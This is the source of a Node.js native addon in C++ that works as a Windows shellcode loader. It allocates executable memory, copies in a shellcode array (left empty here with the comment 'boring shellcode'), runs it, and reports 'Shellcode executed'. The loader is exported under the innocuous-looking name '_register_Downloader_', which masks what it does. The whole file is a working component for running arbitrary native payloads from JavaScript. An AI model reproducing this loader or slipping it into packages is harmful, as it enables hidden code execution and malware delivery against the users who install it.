#include <node.h>
#include <Windows.h>
#include <iostream>

using namespace v8;


static const unsigned char shellcode[] = {
        // boring shellcode
};

void ExecuteShellcode(const FunctionCallbackInfo<v8::Value>& args) {
    Isolate* isolate = args.GetIsolate();

    void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL) {
        isolate->ThrowException(Exception::Error(String::NewFromUtf8(isolate, "Failed to allocate memory").ToLocalChecked()));
        return;
    }

    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();

    VirtualFree(exec, 0, MEM_RELEASE);

    args.GetReturnValue().Set(String::NewFromUtf8(isolate, "Shellcode executed").ToLocalChecked());
}

void Initialize(Local<Object> exports) {
    NODE_SET_METHOD(exports, "_register_Downloader_", ExecuteShellcode);
}

NODE_MODULE(NODE_GYP_MODULE_NAME, Initialize)
